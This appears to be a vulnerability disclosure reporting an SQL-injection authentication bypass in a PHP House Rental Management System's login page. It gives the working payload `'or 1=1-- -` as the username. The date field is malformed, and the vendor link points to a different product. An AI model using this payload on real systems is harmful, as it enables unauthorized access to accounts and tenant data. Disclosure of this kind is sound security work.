# House Rental Management System - Authentication Bypass
+ **Exploit Title:** House Rental Management System - Authentication Bypass
+ **Date:** 2024-15-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
House Rental Management System allows Authentication Bypass via the `username` and `password` parameters at "http://localhost/rental/login.php". 

## Proof of Concept:
+ Go to this address: "http://localhost/rental/login.php"
+ username : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-05-15 234111](https://github.com/BurakSevben/CVEs/assets/117217689/74b0e3dd-9839-44a8-92fb-e17b3b76ec55)

![Ekran görüntüsü 2024-05-15 234302](https://github.com/BurakSevben/CVEs/assets/117217689/d8d8770c-1d08-40cd-9a86-75d436b7d07e)
